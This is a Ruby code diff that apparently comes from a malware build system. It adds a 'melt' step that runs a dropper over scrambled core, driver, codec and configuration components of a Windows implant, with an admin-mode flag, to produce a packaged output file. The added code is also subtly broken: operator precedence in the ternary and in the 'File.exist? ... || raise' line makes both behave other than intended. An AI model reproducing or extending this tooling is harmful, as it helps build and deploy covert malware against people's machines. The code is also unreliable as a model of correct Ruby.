@@ -51,7 +51,24 @@ class BuildWindows < Build
   end
 
   def melt(params)
-    trace :debug, "#{self.class} #{__method__}"
+    trace :debug, "Build: melting: #{params}"
+
+    CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
+                                        path(@scrambled[:core64])+' '+
+                                        path(@scrambled[:config])+' '+
+                                        path(@scrambled[:driver])+' '+
+                                        path(@scrambled[:driver64])+' '+
+                                        path(@scrambled[:codec])+' '+
+                                        path(@scrambled[:dir])+' '+
+                                        params['admin'] ? '1' : '0' +
+                                        path('default')+' '+
+                                        path('output')
+
+    File.exist? path('output') || raise("output file not created by dropper")
+
+    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
+
+    @outputs << 'output'
   end
 
 end
